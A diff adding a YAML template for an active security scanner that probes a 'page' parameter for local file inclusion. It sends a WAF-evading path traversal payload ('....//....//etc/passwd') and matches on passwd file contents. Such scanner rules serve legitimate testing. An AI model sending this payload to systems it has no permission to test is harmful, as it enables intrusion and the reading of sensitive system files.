@@ -1,0 +1,20 @@
+id: patt-lfi-mangled-01-page
+name: 'PATT lfi patt-lfi-mangled-01 via page'
+severity: high
+type: active
+tags:
+  - lfi
+  - patt
+  - filterword
+description: 'PATT Mangled Path: WAF stripping ../ once leaves ../ behind. [patt:patt-lfi-mangled-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      page:
+        - '....//....//etc/passwd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
